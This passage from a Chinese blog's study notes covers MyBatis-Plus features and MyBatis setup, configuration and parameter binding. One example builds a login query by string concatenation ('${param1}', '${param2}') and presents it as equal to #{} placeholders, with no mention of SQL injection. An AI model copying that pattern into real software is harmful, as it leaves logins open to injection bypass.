productWang.setPrice(productWang.getPrice()-30);\n    int result = productMapper.updateById(productWang);\n    if(result == 0){\n        //操作失败，重试\n        Product productNew = productMapper.selectById(1);\n        productNew.setPrice(productNew.getPrice()-30);\n        productMapper.updateById(productNew);\n    }\n\n    //5.老板查询商品价格\n    Product productBoss = productMapper.selectById(1);\n    System.out.println(\"老板获取的商品价格为：\" + productBoss.getPrice());\n}\n```\n\n![](https://img.jwt1399.top/img/202207041215445.png)\n\n## 六、通用枚举\n\n> 表中的有些字段值是固定的，例如性别（男或女），此时我们可以使用MyBatis-Plus的通用枚举来实现\n\n**数据库表添加字段`sex`**\n\n![](https://img.jwt1399.top/img/202207041216570.png)\n\n**创建通用枚举类型**\n\n```java\n@Getter\npublic enum SexEnum {\n    MALE(1, \"男\"),\n    FEMALE(2, \"女\");\n\n    @EnumValue //将注解所标识的属性的值存储到数据库中\n    private int sex;\n    private String sexName;\n\n    SexEnum(Integer sex, String sexName) {\n        this.sex = sex;\n        this.sexName = sexName;\n    }\n}\n```\n\n**User实体类中添加属性sex**\n\n```java\npublic class User {\n    private Long id;\n    @TableField(\"username\")\n    private String name;\n    private Integer age;\n    private String email;\n    @TableLogic\n    private int isDeleted;  //逻辑删除\n\n    private SexEnum sex;\n}\n```\n\n**配置扫描通用枚举**\n\n```yml\nmybatis-plus:\n  # 扫描通用枚举的包\n  type-enums-package: com.jianjian.mpdemo.enums\n```\n\n**执行测试方法**\n\n```java\n@Test\npublic void test(){\n    User user = new User();\n    user.setName(\"admin\");\n    user.setAge(33);\n    user.setSex(SexEnum.MALE);\n    int result = userMapper.insert(user);\n    System.out.println(\"result:\"+result);\n}\n```\n\n## 七、代码生成器\n\n### 1、引入依赖\n\n```xml\n<dependency>\n  <groupId>com.baomidou</groupId>\n  <artifactId>mybatis-plus-generator</artifactId>\n  <version>3.5.1</version>\n</dependency>\n<dependency>\n  <groupId>org.freemarker</groupId>\n  <artifactId>freemarker</artifactId>\n  <version>2.3.31</version>\n</dependency>\n```\n\n### 2、快速生成\n\n```java\npublic class FastAutoGeneratorTest {\n    public static void main(String[] args) {\n        FastAutoGenerator.create(\"jdbc:mysql://127.0.0.1:3306/mybatis_plus? characterEncoding=utf-8&userSSL=false\", \"root\", \"root\")\n                .globalConfig(builder -> {\n                    builder.author(\"jianjian\") // 设置作者\n                            //.enableSwagger() // 开启 swagger 模式\n                            .fileOverride() // 覆盖已生成文件\n                            .outputDir(\"/Users/jianjian/Downloads\"); // 指定输出目录\n                })\n                .packageConfig(builder -> {\n                    builder.parent(\"com.jianjian\") // 设置父包名\n                            .moduleName(\"mybatisplus\") // 设置父包模块名\n                            .pathInfo(Collections.singletonMap(OutputFile.mapperXml, \"/Users/jianjian/Downloads\"));// 设置mapperXml生成路径\n                })\n                .strategyConfig(builder -> {\n                    builder.addInclude(\"t_user\") // 设置需要生成的表名\n                            .addTablePrefix(\"t_\", \"c_\"); // 设置过滤表前缀\n                })\n                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板\n                .execute();\n    }\n}\n```\n\n## 八、多数据源\n\n> 适用于多种场景：纯粹多库、 读写分离、 一主多从、 混合模式等\n\n场景说明：我们创建两个库，分别为：`mybatis_plus`（以前的库不动）与`mybatis_plus_1`（新建），将mybatis_plus库有`User`表，mybatis_plus_1库有`Product`表，这样每个库一张表，通过一个测试用例分别获取用户数据与商品数据，如果获取到说明多库模拟成功\n\n### 1.创建数据库及表\n\n**创建数据库`mybatis_plus_1`和表`product`**\n\n```sql\nCREATE DATABASE `mybatis_plus_1` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;\nuse `mybatis_plus_1`; \nCREATE TABLE product ( \n    id BIGINT(20) NOT NULL COMMENT '主键ID', \n    name VARCHAR(30) NULL DEFAULT NULL COMMENT '商品名称', \n    price INT(11) DEFAULT 0 COMMENT '价格', \n    version INT(11) DEFAULT 0 COMMENT '乐观锁版本号', \n    PRIMARY KEY (id) \n);\n```\n\n**添加测试数据**\n\n```sql\nINSERT INTO product (id, NAME, price) VALUES (1, '外星人笔记本', 100);\n```\n\n**删除`mybatis_plus`库中的`product`表** \n\n```sql\nuse mybatis_plus; \nDROP TABLE IF EXISTS product;\n```\n\n### 2.新建工程引入依赖\n\n> **自行新建一个Spring Boot工程并选择MySQL驱动及Lombok依赖**\n\n**引入MyBaits-Plus的依赖及多数据源的依赖**\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.5.0</version>\n</dependency>\n```\n\n### 3.编写配置文件\n\n```yml\nspring:\n  # 配置数据源信息\n  datasource:\n    dynamic:\n      # 设置默认的数据源或者数据源组,默认值即为master\n      primary: master\n      # 严格匹配数据源,默认false.false使用默认数据源,true未匹配到指定数据源时抛异常\n      strict: false\n      datasource:\n        master:\n          url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          username: root\n          password: root\n        slave_1:\n          url: jdbc:mysql://localhost:3306/mybatis_plus_1?characterEncoding=utf-8&useSSL=false\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          username: root\n          password: root\n```\n\n### 4.创建实体类\n\n新建一个`User`实体类（如果数据库表名有t_前缀记得配置）\n\n```java\n@Data\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n新建一个实体类`Product`\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    private Integer version;\n}\n```\n\n### 5.创建Mapper及Service\n\n新建接口`UserMapper`\n\n```java\npublic interface UserMapper extends BaseMapper<User> {}\n```\n\n新建接口`ProductMapper`\n\n```java\npublic interface ProductMapper extends BaseMapper<Product> {}\n```\n\n新建Service接口`UserService`指定操作的数据源\n\n```java\n@DS(\"master\") //指定操作的数据源，master为user表\npublic interface UserService extends IService<User> {}\n```\n\n新建Service接口`ProductService`指定操作的数据源\n\n```java\n@DS(\"slave_1\")\npublic interface ProductService extends IService<Product> {}\n```\n\n建立Service的实现类\n\n```java\n@Service\n@DS(\"master\") \npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService {\n}\n```\n\n```java\n@Service\n@DS(\"slave_1\") \npublic class ProductServiceImpl extends ServiceImpl<ProductMapper, Product> implements ProductService {\n}\n```\n\n### 6.编写测试方法\n\n> **记得在启动类中添加注解`@MapperScan()`**\n\n```java\nclass TestDatasourceApplicationTests {\n\t@Resource\n\tUserService userService;\n\n\t@Resource\n\tProductService productService;\n\n\t@Test\n\tvoid contextLoads() {\n\t\tUser user = userService.getById(1L);\n\t\tProduct product = productService.getById(1L);\n\t\tSystem.out.println(\"User = \" + user);\n\t\tSystem.out.println(\"Product = \" + product);\n\t}\n}\n```\n\n![](https://img.jwt1399.top/img/202207041919486.png)\n\n## 九、MyBatisX插件\n\n> MyBatis-Plus为我们提供了强大的mapper和service模板，能够大大的提高开发效率。\n>\n> 但是在真正开发过程中，MyBatis-Plus并不能为我们解决所有问题，例如一些复杂的SQL，多表联查，我们就需要自己去编写代码和SQL语句，我们该如何快速的解决这个问题呢，这个时候可以使用MyBatisX插件。\n>\n> MyBatisX一款基于 IDEA 的快速开发插件，为效率而生。\n\n### 1.安装MyBatisX插件\n\n> **打开IDEA，File-> Setteings->Plugins->MyBatisX，搜索栏搜索MyBatisX然后安装。**\n\n![](https://img.jwt1399.top/img/202207041921425.png)\n\n### 2.快速生成代码\n\n新建一个Spring Boot项目引入依赖（创建工程时记得勾选lombok及mysql驱动）\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.5.0</version>\n</dependency>\n```\n\n配置数据源信息\n\n```yml\nspring:\n  datasource:\n    type: com.zaxxer.hikari.HikariDataSource\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n    username: root\n    password: root\n```\n\n在IDEA中与数据库建立链接\n\n![](https://img.jwt1399.top/img/202207041921049.png)\n\n填写数据库信息并保存\n\n![](https://img.jwt1399.top/img/202207041921532.png)\n\n找到我们需要生成的表点击右键\n\n![](https://img.jwt1399.top/img/202207041921993.png)\n\n填写完信息以后下一步\n\n![](https://img.jwt1399.top/img/202207041922081.png)\n\n继续填写信息\n\n![](https://img.jwt1399.top/img/202207041922619.png)\n\n**大功告成**\n\n![](https://img.jwt1399.top/img/202207041923724.png)\n\n\n\n### 3.快速生成CRUD\n\n> MyBaitsX可以根据我们在Mapper接口中输入的方法名快速帮我们生成对应的sql语句\n\n快捷键 Mac：option+enter 、Win：Alt+enter\n\n![](https://img.jwt1399.top/img/202207041923267.png)\n\n![](https://img.jwt1399.top/img/202207041923095.png)\n\n\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MyBatis-Plus"],"categories":["SQL"]},{"title":"MyBatis","url":"/posts/13919.html","content":"\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《MyBatis》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 📝学习资料：[尚硅谷 MyBatis 教程](https://www.bilibili.com/video/BV1VP4y1c7j7?spm_id_from=333.337.search-card.all.click)\n- [x] 🚩时间安排：预计5天更新完\n- [x] 🎯开始时间：05-21\n- [x] 🎉结束时间：05-26\n- [x] 🍀总结：使用很简单，但原理还不懂\n\n## 一、Mybatis简介\n\n### 1.概念\n\n- MyBatis 是一个开源、轻量级的数据持久化框架，是 JDBC 和 Hibernate 的替代方案。\n\n- MyBatis 内部封装了 JDBC，简化了加载驱动、创建连接、创建 statement 等繁杂的过程，开发者只需要关注 SQL 语句本身。\n\n- MyBatis 支持定制化 SQL、存储过程以及高级映射，可以在实体类和 SQL 语句之间建立映射关系，是一种半自动化的 ORM 实现。\n\n### 2.特性\n\n- 1>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架\n- 2>MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集\n- 3>MyBatis可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO（Plain Old Java Objects，普通的Java对象）映射成数据库中的记录\n\n- 4>MyBatis 是一个半自动的ORM（Object Relation Mapping）框架\n\n### 3.对比\n\n和 Hibernate 相比，MyBatis 封装性低于 Hibernate，但性能优秀、小巧、简单易学、应用广泛。\n\n和 JDBC 相比，MyBatis 减少了 50% 以上的代码量，并且满足高并发和高响应的要求。\n\n## 二、搭建MyBatis\n\n### 1.创建Maven工程\n\n- 1>打包方式：jar\n\n```xml\n<packaging>jar</packaging>\n```\n\n- 2>引入依赖\n\n```xml\n<dependencies>\n  <!-- Mybatis核心 -->\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis</artifactId>\n    <version>3.5.9</version>\n  </dependency>\n  <!-- junit测试 -->\n  <dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.12</version>\n    <scope>test</scope>\n  </dependency>\n  <!-- MySQL驱动 -->\n  <dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <version>8.0.27</version>\n  </dependency>\n</dependencies>\n```\n\n### 2.创建MyBatis核心配置文件\n\n> 习惯上命名为`mybatis-config.xml`，存放的位置是src/main/resources目录下\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>  \n<!DOCTYPE configuration  \nPUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"  \n\"http://mybatis.org/dtd/mybatis-3-config.dtd\">  \n<configuration>  \n\t<!--设置连接数据库的环境-->  \n\t<environments default=\"development\">  \n\t\t<environment id=\"development\">  \n\t\t\t<transactionManager type=\"JDBC\"/>  \n\t\t\t<dataSource type=\"POOLED\">  \n\t\t\t\t<property name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/>  \n\t\t\t\t<property name=\"url\" value=\"jdbc:mysql://localhost:3306/MyBatis\"/>  \n\t\t\t\t<property name=\"username\" value=\"root\"/>  \n\t\t\t\t<property name=\"password\" value=\"root\"/>  \n\t\t\t</dataSource>  \n\t\t</environment>  \n\t</environments>  \n\t<!--引入映射文件-->  \n\t<mappers>  \n\t\t<mapper resource=\"mappers/UserMapper.xml\"/>  \n\t</mappers>  \n</configuration>\n```\n\n### 3.创建mapper接口\n\n>MyBatis中的mapper接口相当于以前的dao。区别在于mapper仅仅是接口，我们不需要提供实现类\n\n```java\npackage com.jianjian.mapper;\n\npublic interface UserMapper {\n    /**\n     * 添加用户信息  \n     */\n    int insertUser();\n}\n```\n\n### 4.创建MyBatis映射文件\n\n- 相关概念：ORM（Object Relationship Mapping）对象关系映射。 \n  - 对象：Java的实体类对象  \n  - 关系：关系型数据库  \n  - 映射：二者之间的对应关系\n\n\n| Java概念 | 数据库概念 |\n| -------- | ---------- |\n| 类       | 表         |\n| 属性     | 字段/列    |\n| 对象     | 记录/行    |\n\n**映射文件的命名规则：表所对应的实体类的类名+Mapper.xml，存放的位置是src/main/resources/mappers目录下**\n\n- 例如：表t_user，映射的实体类为User，所对应的映射文件为UserMapper.xml \n- 因此一个映射文件对应一个实体类，对应一张表的操作\n- MyBatis映射文件用于编写SQL，访问以及操作表中的数据\n\nMyBatis中面向接口操作数据，要保证两个一致\n\n- 条件1：mapper接口的全类名和映射文件的命名空间（namespace）保持一致\n- 条件2：mapper接口中方法的方法名和映射文件中编写SQL的标签的id属性保持一致\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>  \n<!DOCTYPE mapper  \nPUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"  \n\"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">  \n<mapper namespace=\"com.jianjian.mapper.UserMapper\">  <!--条件1-->  \n\t<insert id=\"insertUser\">  <!--条件2-->  \n\t\tinsert into t_user values(null,'张三','123',23,'女')  \n\t</insert>  \n</mapper>\n```\n\n### 5.通过junit测试功能\n\n- 1>创建数据库Mybatis、数据表t_user\n\n```sql\nDROP TABLE IF EXISTS `t_user`;\nCREATE TABLE `t_user` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `username` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  `password` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  `age` int(11) DEFAULT NULL,\n  `sex` char(1) CHARACTER SET utf8 DEFAULT NULL,\n  `email` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n- 2>创建User实体类\n\n```java\npackage com.jianjian.pojo;\n\npublic class User {\n    private Integer id;\n    private String username;\n    private String password;\n    private Integer age;\n    private String sex;\n    private String email;\n  \t//...构造器、get、set、toString方法\n}\n```\n\n- 3>创建测试类\n\n```java\npublic class UserMapperTest {\n    @Test\n    public void testInsertUser() throws IOException {\n        //读取MyBatis的核心配置文件\n        InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n        //获取SqlSessionFactoryBuilder对象\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n        //通过核心配置文件所对应的字节输入流创建工厂类SqlSessionFactory，生产SqlSession对象\n        SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n        //获取sqlSession，此时通过SqlSession对象所操作的sql都必须手动提交或回滚事务\n        //SqlSession sqlSession = sqlSessionFactory.openSession();\n\t      //创建SqlSession对象，此时通过SqlSession对象所操作的sql都会自动提交  \n\t\t    SqlSession sqlSession = sqlSessionFactory.openSession(true);\n        //通过代理模式创建UserMapper接口的代理实现类对象\n        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n        //调用UserMapper接口中的方法，就可以根据UserMapper的全类名匹配元素文件，通过调用的方法名匹配映射文件中的SQL标签，并执行标签中的SQL语句\n        int result = userMapper.insertUser();\n        //提交事务\n        //sqlSession.commit();\n        System.out.println(\"result:\" + result);\n    }\n}\n```\n\n- SqlSession：代表Java程序和数据库之间的会话。（HttpSession是Java程序和浏览器之间的会话）\n- SqlSessionFactory：是“生产”SqlSession的“工厂”\n- 工厂模式：如果创建某一个对象，使用的过程基本固定，那么我们就可以把创建这个对象的相关代码封装到一个“工厂类”中，以后都使用这个工厂类来“生产”我们需要的对象\n- 此时需要手动提交事务，如果要自动提交事务，则在获取sqlSession对象时，使用`SqlSession sqlSession = sqlSessionFactory.openSession(true);`，传入一个Boolean类型的参数，值为true，这样就可以自动提交\n\n### 6.封装SqlSessionUtils工具类\n\n新建utils/SqlSessionUtils.java\n\n```java\npublic class SqlSessionUtils {\n    public static SqlSession getSqlSession(){\n        SqlSession sqlSession = null;\n        try {\n            //读取MyBatis的核心配置文件\n            InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n            //获取SqlSessionFactoryBuilder对象\n            SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n            //通过核心配置文件所对应的字节输入流创建工厂类SqlSessionFactory，生产SqlSession对象\n            SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n            //创建SqlSession对象，此时通过SqlSession对象所操作的sql都会自动提交\n            sqlSession = sqlSessionFactory.openSession(true);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        return sqlSession;\n    }\n}\n```\n\n### 7.加入log4j日志功能\n\n- 1>加入依赖\n\n```xml\n<!-- log4j日志 -->\n<dependency>\n<groupId>log4j</groupId>\n<artifactId>log4j</artifactId>\n<version>1.2.17</version>\n</dependency>\n```\n\n- 2>加入log4j的配置文件\n\n  - log4j的配置文件名为log4j.xml，存放的位置是src/main/resources目录下\n\n  - 日志的级别：FATAL(致命)>ERROR(错误)>WARN(警告)>INFO(信息)>DEBUG(调试) \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE log4j:configuration SYSTEM \"log4j.dtd\">\n<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">\n    <appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">\n        <param name=\"Encoding\" value=\"UTF-8\" />\n        <layout class=\"org.apache.log4j.PatternLayout\">\n\t\t\t<param name=\"ConversionPattern\" value=\"%-5p %d{MM-dd HH:mm:ss,SSS} %m (%F:%L) \\n\" />\n        </layout>\n    </appender>\n    <logger name=\"java.sql\">\n        <level value=\"debug\" />\n    </logger>\n    <logger name=\"org.apache.ibatis\">\n        <level value=\"info\" />\n    </logger>\n    <root>\n        <level value=\"debug\" />\n        <appender-ref ref=\"STDOUT\" />\n    </root>\n</log4j:configuration>\n```\n\n## 三、核心配置文件详解\n\n>核心配置文件中的标签必须按照固定的顺序(有的标签可以不写，但顺序一定不能乱)：\n>**顺序为：**properties、settings、typeAliases、typeHandlers、objectFactory、objectWrapperFactory、reflectorFactory、plugins、environments、databaseIdProvider、mappers\n\n### 1.properties\n\n- 1>添加properties标签\n\n```xml\n<!--引入properties文件，此时就可以${属性名}的方式访问属性值-->\n<properties resource=\"jdbc.properties\"></properties>\n```\n\n- 2>创建resources/jdbc.properties\n\n```properties\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/Mybatis\njdbc.username=root\njdbc.password=root\n```\n\n### 2.settings\n\n```xml\n<settings>\n  <!--将表中字段的下划线自动转换为驼峰-->\n  <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n  <!--开启延迟加载-->\n  <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n</settings>\n```\n\n### 3.typeAliases\n\n- typeAlias：设置某个具体的类型的别名\n- 属性：\n  -  type：需要设置别名的类型的全类名\n  - alias：设置此类型的别名，且别名不区分大小写。若不设置此属性，该类型拥有默认的别名，即类名\n\na>设置单个对象别名\n\n```xml\n<typeAliases>\n  <typeAlias type=\"com.jianjian.pojo.User\"></typeAlias>  <!--默认别名，类名-->\n  <typeAlias type=\"com.jianjian.pojo.User\" alias=\"user\"></typeAlias><!--自定义别名-->\n</typeAliases>\n```\n\nb>设置某包下所有对象拥有默认别名\n\n```xml\n<typeAliases>\n  <!--以包为单位，设置改包下所有的类型都拥有默认的别名，即类名且不区分大小写-->\n  <package name=\"com.jianjian.pojo\"/>\n</typeAliases>\n```\n\n**在MyBatis中，对于Java中常用的类型都设置了类型别名**  \n\n| 别名       | 映射的类型 |\n| :--------- | :--------- |\n| _byte      | byte       |\n| _long      | long       |\n| _short     | short      |\n| _int       | int        |\n| _integer   | int        |\n| _double    | double     |\n| _float     | float      |\n| _boolean   | boolean    |\n| string     | String     |\n| byte       | Byte       |\n| long       | Long       |\n| short      | Short      |\n| int        | Integer    |\n| integer    | Integer    |\n| double     | Double     |\n| float      | Float      |\n| boolean    | Boolean    |\n| date       | Date       |\n| decimal    | BigDecimal |\n| bigdecimal | BigDecimal |\n| object     | Object     |\n| map        | Map        |\n| hashmap    | HashMap    |\n| list       | List       |\n| arraylist  | ArrayList  |\n| collection | Collection |\n| iterator   | Iterator   |\n\n### 4.plugins\n\n```xml\n<plugins>\n  <plugin interceptor=\"org.mybatis.example.ExamplePlugin\">\n    <property name=\"someProperty\" value=\"100\"/>\n  </plugin>\n</plugins>\n```\n\n### 5.environments\n\n```xml\n<environments default=\"mysql_test\">\n  <!--\n    environment：设置具体的连接数据库的环境信息\n    属性：id：设置环境的唯一标识，可通过environments标签中的default设置某一个环境的id，表示默认使用的环境\n   -->\n  <environment id=\"mysql_test\">\n    <!--\n      transactionManager：设置事务管理方式\n         属性：\n          type：设置事务管理方式，type=\"JDBC|MANAGED\"\n          type=\"JDBC\"：设置当前环境的事务管理都必须手动处理\n          type=\"MANAGED\"：设置事务被管理，例如spring中的AOP\n     -->\n    <transactionManager type=\"JDBC\"/>\n    <!--\n     dataSource：设置数据源\n      属性：\n        type：设置数据源的类型，type=\"POOLED|UNPOOLED|JNDI\"\n        type=\"POOLED\"：使用数据库连接池，即会将创建的连接进行缓存，下次使用可以从缓存中直接获取，不需要重新创建\n         type=\"UNPOOLED\"：不使用数据库连接池，即每次使用连接都需要重新创建\n         type=\"JNDI\"：调用上下文中的数据源\n       -->\n    <dataSource type=\"POOLED\">\n      <!--设置驱动类的全类名-->\n      <property name=\"driver\" value=\"${jdbc.driver}\"/>\n      <!--设置连接数据库的连接地址-->\n      <property name=\"url\" value=\"${jdbc.url}\"/>\n      <!--设置连接数据库的用户名-->\n      <property name=\"username\" value=\"${jdbc.username}\"/>\n      <!--设置连接数据库的密码-->\n      <property name=\"password\" value=\"${jdbc.password}\"/>\n    </dataSource>\n  </environment>\n</environments>\n```\n\n### 6.mappers\n\na>引入单个映射文件\n\n```xml\n<!--引入映射文件-->\n<mappers>\n  <mapper resource=\"UserMapper.xml\"/>\n</mappers>\n```\n\na>引入包下所有映射文件\n\n- 条件1：此方式必须保证mapper接口和mapper映射文件必须在相同的包名下\n- 条件2：mapper接口要和mapper映射文件的名字一致\n\n```xml\n<!--引入映射文件-->\n<mappers>\n  <package name=\"com.jianjian.mapper\"/>\n</mappers>\n```\n\n![](https://img.jwt1399.top/img/202211151859675.png)\n\n### 7.设置配置文件模版\n\nIDEA偏好设置→编辑器→文件和代码模版→点击“+”号新建模版→名字设置为mybatis-config→扩展设置为xml→复制下面代码并保存\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <!--引入properties-->\n    <properties resource=\"jdbc.properties\"></properties>\n    <!--设置别名-->\n    <typeAliases>\n        <package name=\"com.jianjian.pojo\"/>\n    </typeAliases>\n    <!--设置连接数据库的环境-->\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"${jdbc.driver}\"/>\n                <property name=\"url\" value=\"${jdbc.url}\"/>\n                <property name=\"username\" value=\"${jdbc.username}\"/>\n                <property name=\"password\" value=\"${jdbc.password}\"/>\n            </dataSource>\n        </environment>\n    </environments>\n    <!--引入映射文件-->\n    <mappers>\n        <package name=\"com.jianjian.mapper\"/>\n    </mappers>\n</configuration>\n```\n\n## 四、MyBatis的增删改查\n\n### 1.添加\n\n```java\npackage com.jianjian.mapper;\npublic interface UserMapper {\n    int insertUser();\n}\n```\n\n```xml\n<!--int insertUser();-->\n<insert id=\"insertUser\">\n\tinsert into t_user values(null,'admin','123456',23,'男','12345@qq.com')\n</insert>\n```\n\n```java\n@Test\npublic void testInsertUser(){\n    SqlSession sqlsession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlsession.getMapper(UserMapper.class);\n    int result = userMapper.insertUser();\n    System.out.println(\"result:\" + result);\n}\n```\n\n### 2.删除\n\n```java\npackage com.jianjian.mapper;\npublic interface UserMapper {\n    int insertUser();\n    int deleteUser();\n}\n```\n\n```xml\n<!--int deleteUser();-->\n <delete id=\"deleteUser\">\n     delete from t_user where id = 6\n </delete>\n```\n\n```java\n@Test\npublic void testDeleteUser(){\n    SqlSession sqlsession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlsession.getMapper(UserMapper.class);\n    int result = userMapper.deleteUser();\n    System.out.println(\"result:\" + result);\n}\n```\n\n### 3.修改\n\n```xml\n<!--int updateUser();-->\n <update id=\"updateUser\">\n     update t_user set username = '张三' where id = 5\n </update>\n```\n\n### 4.查询一个实体类对象\n\n```xml\n<!--User getUserById();-->  \n<select id=\"getUserById\" resultType=\"com.jianjian.pojo.User\">  \n\tselect * from t_user where id = 2  \n</select>\n```\n\n### 5.查询集合\n\n```xml\n<!--List<User> getUserList();-->\n<select id=\"getUserList\" resultType=\"User\">\n\tselect * from t_user\n</select>\n```\n\n注意：\n\n- 查询的标签select必须设置属性resultType或resultMap，用于设置实体类和数据库表的映射关系  \n\n  - resultType：自动映射，用于属性名和表中字段名一致的情况，值为全类名或别名\n\n  - resultMap：自定义映射，用于一对多或多对一或字段名和属性名不一致的情况  \n\n- 当查询的数据为多条时，不能使用实体类作为返回值，只能使用集合，否则会抛出异常`TooManyResultsException`；但是若查询的数据只有一条，可以使用实体类或集合作为返回值\n\n## 五、Mybatis获取参数值\n\n- MyBatis获取参数值的两种方式：`${}`和`#{}`  \n- `${}`的本质就是字符串拼接\n  - `${}`使用字符串拼接的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，**需要手动添加单引号**\n\n- `#{}`的本质就是占位符赋值  \n  - `#{}`使用占位符赋值的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，**可以自动添加单引号**\n\n\n### 1.单个字面量类型的参数\n\n若mapper接口中的方法参数为单个的字面量类型，此时可以使用`${}`和`#{}`\n\n- 以任意的名称（最好见名识意）获取参数的值，注意`${}`需要手动加单引号\n\n```xml\n<!--User getUserByUsername(String username);-->\n<select id=\"getUserByUsername\" resultType=\"User\">\n\tselect * from t_user where username = #{username}\n</select>\n```\n\n```xml\n<!--User getUserByUsername(String username);-->\n<select id=\"getUserByUsername\" resultType=\"User\">  \n\tselect * from t_user where username = '${username}'  \n</select>\n```\n\n```java\n@Test\npublic void testUserByUsername(){\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n  User user = userMapper.getUserByUsername(\"admin\");\n  System.out.println(\"result:\" + user);\n}\n```\n\n### 2.多个字面量类型的参数\n\n若mapper接口中的方法参数为多个时，此时MyBatis会自动将这些参数放在一个map集合中\n\n- 以arg0,arg1...为键，以参数为值，或者以param1,param2...为键，以参数为值；\n\n- 使用arg或者param都行，要注意的是，arg是从arg0开始的，param是从param1开始的\n\n```xml\n<!--User checkLogin(String username,String password);-->\n<select id=\"checkLogin\" resultType=\"User\">  \n\tselect * from t_user where username = #{arg0} and password = #{arg1}  \n</select>\n```\n\n```xml\n<!--User checkLogin(String username,String password);-->\n<select id=\"checkLogin\" resultType=\"User\">\n\tselect * from t_user where username = '${param1}' and password = '${param2}'\n</select>\n```\n\n```java\n@Test\npublic void testcheckLogin(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n    User user = userMapper.checkLogin(\"admin\",\"123456\");\n    System.out.println(\"result:\" + user);\n}\n```\n\n### 3.map集合类型的参数\n\n若mapper接口中的方法需要的参数为多个时，此时可以手动创建map集合\n\n将这些数据放在map中只需要通过`${}`和`#{}`访问map集合的键就可以获取相对应的值，注意`${}`需要手动加单引号\n\n```xml\n<!--User 